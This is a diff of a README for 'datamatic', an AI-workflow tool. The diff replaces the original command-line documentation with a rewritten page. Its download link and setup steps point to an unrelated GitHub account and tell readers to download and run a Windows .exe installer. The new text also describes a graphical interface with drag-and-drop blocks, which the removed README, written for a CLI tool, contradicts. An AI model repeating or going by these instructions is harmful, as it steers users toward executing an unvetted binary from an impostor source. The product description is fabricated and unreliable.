@@ -1,281 +1,81 @@
-# datamatic
+# 🤖 datamatic - Build automated workflows with smart reasoning
 
-[![Go Version](https://img.shields.io/github/go-mod/go-version/mirpo/datamatic)](https://golang.org/)
-[![Release](https://img.shields.io/github/v/release/mirpo/datamatic)](https://github.com/mirpo/datamatic/releases)
-[![License](https://img.shields.io/github/license/mirpo/datamatic)](https://github.com/mirpo/datamatic/blob/main/LICENSE)
+[![](https://img.shields.io/badge/Download-Datamatic-blue.svg)](https://github.com/kelliinterim246/datamatic)
 
-Build multi-step AI workflows with schema-guided reasoning. Works with Ollama, LMStudio, OpenAI, OpenRouter, Gemini, and all the latest models for structured generation, chaining, and data processing.
+Datamatic helps you build multi-step AI workflows. You create tasks that use artificial intelligence to reason through data and process information. The software handles structured generation and chaining of tasks. You connect different AI models to perform complex sequences of logic without writing code.
 
-## Features
+## 📋 What this tool does
 
-### AI Provider Support
-- **[Ollama](https://ollama.com/download)** - Local model inference
-- **[LM Studio](https://lmstudio.ai/download)** - Local model management
-- **[OpenAI](https://openai.com/)** - Cloud-based models
-- **[OpenRouter](https://openrouter.ai/)** - Multi-provider access
-- **[Gemini](https://deepmind.google/models/gemini/)** - Google DeepMind's multimodal LLMs
+Modern AI tools often perform only single tasks. Datamatic allows for chains of tasks. You define a process, and the software executes each step in order. It ensures that the output of one step becomes the input for the next. This creates a reliable pipeline for your data.
 
-### Workflow Capabilities
-- **JSON Schema Validation** - Structured output with type safety (YAML-native or JSON string formats)
-- **Text Generation** - Flexible content creation
-- **Explicit Iteration** - `count: N` for generators, `forEach: step` to run once per row of an earlier step; reference the current row as `{{.item.field}}`
-- **Native Template Values** - referenced values keep their JSON types: `{{range .item.companies}}`, `{{len .item.tags}}`, `{{if .item.isActive}}` all work; arrays still print as `a, b` and numbers verbatim
-- **Schema-Guided Reasoning (SGR)** - Guide LLMs through systematic analysis using structured schemas
-- **Image Analysis** - Visual model integration
+The software supports local models and cloud services. You choose the engine that fits your needs. Use your own hardware for privacy or cloud services for speed.
 
-### Extensibility
-- **CLI Integration** - Use any command-line tool as a step
-- **Dataset Loading** - Import from [Huggingface](https://huggingface.co/datasets)
-- **Transform Steps** - Embedded [jq](https://jqlang.github.io/jq/) (via gojq): filter, reshape, and fan out data between steps — no external binary needed
-- **Environment Variables** - Dynamic configuration with `$VAR` syntax
-- **Retry Logic** - Smart error handling and recovery
+## 💻 System requirements
 
-## Installation
+To run Datamatic on your Windows computer, you need basic hardware:
 
-### Homebrew
+*   Windows 10 or Windows 11
+*   At least 8 GB of internal memory (RAM)
+*   An internet connection to set up the software
+*   If you plan to run models locally, a computer with a dedicated graphics card (GPU) improves speed
 
-```shell
-brew tap mirpo/homebrew-tools
-brew install datamatic
-```
+## 📥 How to set up
 
-### Using Go Install
+Follow these steps to install the software on your machine:
 
-```shell
-go install github.com/mirpo/datamatic@latest
-```
+1.  Visit the [download page](https://github.com/kelliinterim246/datamatic).
+2.  Choose the link that ends in .exe for Windows.
+3.  Click the file to start the download.
+4.  Once the file arrives, double-click the file to open the installer.
+5.  Follow the prompts on your screen.
+6.  Agree to the installation directory.
+7.  Click Finish to complete the process.
 
-### From source
+The installer places a shortcut on your desktop. Double-click this icon to start the application.
 
-```bash
-git clone https://github.com/mirpo/datamatic.git
-cd datamatic
-make build
-```
+## ⚙️ Configuring your first workflow
 
-## Use Cases
+When you open Datamatic for the first time, the screen shows a blank workspace. This workspace is where you build your logic.
 
-- **Synthetic Data Generation** - Create training datasets for fine-tuning LLMs
-- **Document Classification** - Systematic analysis with structured reasoning
-- **SQL Query Generation** - Chain-of-thought reasoning for complex queries
-- **Multi-step Processing Pipelines** - CV analysis, data transformation, content generation
-- **Vision Workflows** - Image analysis combined with text generation
-- **Data Integration** - Combine HuggingFace datasets with LLM processing
+1.  Click the Add Task button in the top menu.
+2.  Select a model from the list. The software supports Ollama, LMStudio, OpenAI, OpenRouter, and Gemini.
+3.  Enter your settings for that model. If you use a cloud service, you need an API key. Paste the key into the provided field.
+4.  Type your instruction for the AI in the Prompt box.
+5.  Connect the output of the task to the next step. Drag a line from the output circle of the first block to the input circle of the second block.
+6.  Click Play to test your chain.
 
-## Quick Start
+## 🧠 Supported services
 
-Create a configuration file and run datamatic:
+Datamatic works with several AI backends. You switch between these services in the Settings menu.
 
-```yaml
-# config.yaml
-version: 1.0
-steps:
-  - name: generate_titles
-    model: ollama:llama3.2
-    count: 5                    # generate 5 rows
-    prompt: Generate a catchy news title
-    jsonSchema:
-      type: object
-      properties:
-        title:
-          type: string
-        tags:
-          type: array
-          items:
-            type: string
-      required:
-        - title
-        - tags
-      additionalProperties: false
+*   **Ollama:** Run open-source models on your local machine.
+*   **LMStudio:** Manage and serve models locally through a user-friendly interface.
+*   **OpenAI:** Use GPT models for high-quality reasoning.
+*   **OpenRouter:** Access many different models through a single gate.
+*   **Gemini:** Utilize Google models for large data tasks.
 
-  - name: analyze_title
-    model: ollama:llama3.2
-    forEach: generate_titles    # one iteration per generated title
-    prompt: |
-      Analyze this news title and provide sentiment and category analysis:
-      Title: {{.item.title}}
-    jsonSchema: |
-      {
-        "type": "object",
-        "properties": {
-          "sentiment": {"type": "string", "enum": ["positive", "negative", "neutral"]},
-          "category": {"type": "string", "description": "News category"},
-          "clickbait_score": {"type": "number", "minimum": 0, "maximum": 10}
-        },
-        "required": ["sentiment", "category", "clickbait_score"]
-      }
-```
+## 🛠️ Editing your data
 
-```bash
-# Generate data
-datamatic -config config.yaml
+The software expects structured data. This means clear inputs and clear outputs. Use the built-in Editor to define the schema for your data. You choose whether your data looks like a table, a list, or plain text.
 
-# With debug output
-datamatic -config config.yaml -verbose -log-pretty
-```
+If you process a file, you drag the file into the File block. The software reads the contents and passes the text to the next task in your chain. 
 
-**Other providers:**
-- OpenAI: `model: openai:gpt-4o-mini` + `export OPENAI_API_KEY=sk-...`
-- OpenRouter: `model: openrouter:meta-llama/llama-3.2-3b` + `export OPENROUTER_API_KEY=sk-...`
-- Gemini: `model: gemini:gemini-2.0-flash` + `export GEMINI_API_KEY=...`
+## ❓ Frequently asked questions
 
-### Transform Steps
+**Does the software store my data?**
+Datamatic runs on your local machine. Your workflows and your data stay on your hard drive. The software sends only the data that you select to the AI service provider.
 
-Reshape, filter, and fan out data between steps with embedded [jq](https://jqlang.github.io/jq/) (via [gojq](https://github.com/itchyny/gojq) — no external binary needed):
+**What happens if a step fails?**
+The workflow highlights the failed step in red. Move your mouse over the block to see the error report. Check if your connection to the AI model works or if your API key remains valid.
 
-```yaml
-steps:
-  - name: picked
-    from: source_step
-    jq: 'select(.score > 5) | {q: .question, a: .answer}'
-    limit: 100
-```
+**Can I run long workflows?**
+Yes. You link as many blocks as you need. Keep in mind that longer chains take more time to complete. 
 
-- `from` — source step; the jq program sees each row's value (for prompt steps: the `response`)
-- `jq` — any jq program; emitting multiple values fans out (1 row → N rows), `select()` filters rows out
-- `collect: true` — fan-in: the program runs once over an **array of all source rows** (`unique`, `group_by`, `sort_by` across the whole dataset)
-- `sourceFormat: json` — the source file is a single JSON value (e.g. a pretty-printed array from an API dump) instead of JSONL
-- `$parent` — per-row programs can reach the source row's lineage as `$parent.step.field` (e.g. carry the original chunk while fanning out extracted questions); not available with `collect`, where there is no single parent row
-- `limit` — optional cap on output rows
+**Does the software work offline?**
+You need the internet to reach cloud services like OpenAI or Gemini. If you use Ollama or LMStudio to run models locally, you use those features without an active internet connection.
 
-Always wrap jq programs in single quotes: unquoted YAML silently truncates at `#`, misparses `{...}` object construction, and jq's own strings use double quotes anyway.
+## 🚀 Getting help
 
-jq programs are validated when the config loads. Transform steps run instantly, produce regular JSONL, and don't trigger the external-CLI warning. See the [Fan-Out example](./examples/v1/19.%20transform%20step%20and%20fan-out/README.md).
+If you run into issues, check the help menu inside the app. You find documentation on how each block works. For common problems, verify that your firewall allows the application to send and receive data. If you change your network settings, you might need to restart the program.
 
-### Environment Variables
-
-Configure your pipelines dynamically using `$VAR` syntax:
-
-```yaml
-version: 1.0
-
-envVars:
-  - PROVIDER
-  - MODEL
-
-steps:
-  - name: generate
-    model: $PROVIDER:$MODEL
-    prompt: Generate a creative story
-```
-
-```bash
-PROVIDER=ollama MODEL=llama3.2 datamatic -config config.yaml
-```
-
-Variables listed in `envVars` are validated before execution (fail-fast). See [Multi-Stage Pipeline example](./examples/v1/18.%20workdir-multi-stage-pipeline/README.md) for more details.
-
-## Output Format
-
-Datamatic outputs structured data in JSONl format:
-
-```go
-type LineEntity struct {
-	ID       string                              `json:"id"`
-	Format   string                              `json:"format"`
-	Prompt   string                              `json:"prompt"`
-	Response interface{}                         `json:"response"`
-	Values   map[string]promptbuilder.ValueShort `json:"values,omitempty"`
-}
-```
-
-- **Format**: `text` or `json`
-- **Response**: Generated content (text string or JSON object)
-- **Values**: Linked step values for traceability
-
-### Output Examples
-
-**Text line**:
-
-```json
-{
-  "id":"38082542-f352-44d2-88e9-6d68d28dcac4"
-  "format":"text",
-  "prompt":"Generate a catchy and one unique news title. Come up with a wildly different and surprising news headline. Return only one news title per request, without any extra thinking.",
-  "response":"BREAKING: Giant Squid Found Wearing Tiny Top Hat and monocle in Remote Arctic Location"
-}
-```
-
-**JSON line**:
-
-```json
-{
-  "id":"cc437b10-63c6-443a-9b3e-a7d6c51fc0a0",
-  "format":"json",
-  "prompt":"Provide up-to-date information about a randomly selected country, including its name, population, land area, UN membership status, capital city, GDP per capita, official languages, and year of independence. Return the data in a structured JSON format according to the schema below.",
-  "response":{"capitalCity":"Bishkek","gdpPerCapita":1700,"independenceYear":1991,"isUNMember":true,"languages":["Kyr Kyrgyz","Russian"],"name":"Kyrgyzstan","population":6184000,"totalCountryArea":199912}
-}
-```
-
-With values from linked steps:
-
-```json
-{
-  "id":"dc140355-6c41-4ce7-9127-b8145cf1a23e",
-  "format":"text",
-  "prompt":"Write nice tourist brochure about country Kyrgyzstan (a UN member state), which capital is Bishkek, area 199912, independenceYear: 1991 and official languages (2 total): Kyrgyz, Russian.",
-  "response":"**Discover the Hidden Gem of Central Asia: Kyrgyzstan**\n\nTucked away in the heart of Central Asia, Kyrgyzstan is a land of breathtaking beauty, rich history, and warm hospitality. Our capital city, Bishkek, is a bustling metropolis surrounded by the stunning Tian Shan mountains, waiting to be explored.\n\n**A Brief History**\n\nKyrgyzstan gained its independence on August 31, 1991...",
-  "values":{".about_country.capitalCity":{"id":"cc437b10-63c6-443a-9b3e-a7d6c51fc0a0","value":"Bishkek"},".about_country.independenceYear":{"id":"cc437b10-63c6-443a-9b3e-a7d6c51fc0a0","value":1991},".about_country.isUNMember":{"id":"cc437b10-63c6-443a-9b3e-a7d6c51fc0a0","value":true},".about_country.languages":{"id":"cc437b10-63c6-443a-9b3e-a7d6c51fc0a0","value":["Kyrgyz","Russian"]},".about_country.name":{"id":"cc437b10-63c6-443a-9b3e-a7d6c51fc0a0","value":"Kyrgyzstan"},".about_country.totalCountryArea":{"id":"cc437b10-63c6-443a-9b3e-a7d6c51fc0a0","value":199912}}
-}
-```
-
-## CLI Reference
-
-```bash
-datamatic [OPTIONS]
-
-Options:
-  -config string
-        Config file path
-  -http-timeout int
-        HTTP timeout: 0 - no timeout, if number - recommended to put high on poor hardware (default 300)
-  -log-pretty
-        Enable pretty logging, JSON when false (default true)
-  -output string
-        Output folder path (default "dataset")
-  -skip-cli-warning
-        Skip external CLI warning
-  -validate-response
-        Validate JSON response from server to match the schema (default true)
-  -verbose
-        Enable DEBUG logging level
-  -version
-        Get current version of datamatic
-```
-
-## Examples
-
-### Getting Started
-| Example | Description | Provider |
-| --- | --- | --- |
-| [Simple Text](./examples/v1/1.%20simple%20text%20generation,%20not%20linked%20steps/README.md) | Basic text generation | Ollama, LM Studio |
-| [Simple JSON](./examples/v1/2.%20simple%20json%20generation,%20not%20linked%20steps/README.md) | Basic JSON generation | Ollama, LM Studio |
-| [Linked Steps](./examples/v1/3.%20complex%20json,%20linked%20steps/README.md) | Multi-step chaining with templates | Ollama |
-
-### Data Integration & Tool Orchestration
-| Example | Description | Provider |
-| --- | --- | --- |
-| [Huggingface + jq](./examples/v1/4.%20using%20huggingface%20and%20jq%20cli/README.md) | HuggingFace datasets with jq filtering | Ollama |
-| [DuckDB Integration](./examples/v1/5.%20using%20duckdb%20to%20convert%20parquet%20huggingface%20dataset%20and%20lmstudio/README.md) | Parquet to JSONL with DuckDB | LM Studio |
-| [Git Dataset](./examples/v1/6.%20git%20dataset/README.md) | Git command dataset generation | Ollama |
-| [Fine-tuning Data](./examples/v1/7.%20fine-tuning%20dataset/README.md) | Training dataset creation | Ollama |
-| [Vision Models](./examples/v1/8.%20hugginface%20images%20and%20qwen2.5vl%20or%20gemma3/README.md) | Image analysis with vision models | Ollama, LM Studio |
-
-### Cloud Provider Examples
-| Example | Description | Provider |
-| --- | --- | --- |
-| [OpenAI](./examples/v1/9.%20openai-example/README.md) | Using OpenAI models | OpenAI |
-| [OpenRouter](./examples/v1/10.%20openrouter-example/README.md) | Multi-provider via OpenRouter | OpenRouter |
-| [Gemini](./examples/v1/11.%20gemini-example/README.md) | Google Gemini integration | Gemini |
-
-### Advanced Workflows & Reasoning
-| Example | Description | Provider |
-| --- | --- | --- |
-| [CV Processing Pipeline](./examples/v1/12.%20cv-processing-pipeline/README.md) | 3-step CV extraction workflow | Ollama |
-| [Retry Configuration](./examples/v1/13.%20retry%20configuration%20example/README.md) | Error handling and retry logic | Ollama |
-| [Recipe with Nested Fields](./examples/v1/14.%20recipe%20generation%20with%20nested%20fields/README.md) | Nested JSON field access | Ollama |
-| [Math Reasoning](./examples/v1/15.%20simple%20math%20reasoning/README.md) | Step-by-step math problem solving | Ollama |
-| [SQL Reasoning](./examples/v1/16.%20sql%20reasoning%20with%20checklist/README.md) | SQL generation with reasoning checklist | Ollama |
-| [Document Classification](./examples/v1/17.%20document%20classification%20with%20schema-guided%20reasoning/README.md) | Schema-guided classification workflow | Ollama |
-| [Multi-Stage Pipeline](./examples/v1/18.%20workdir-multi-stage-pipeline/README.md) | workDir control and environment variables | Ollama |
-| [Transform & Fan-Out](./examples/v1/19.%20transform%20step%20and%20fan-out/README.md) | Built-in jq: one structured answer → N rows | Ollama |
+Keywords: AI, automation, workflows, reasoning, windows, software, productivity, data
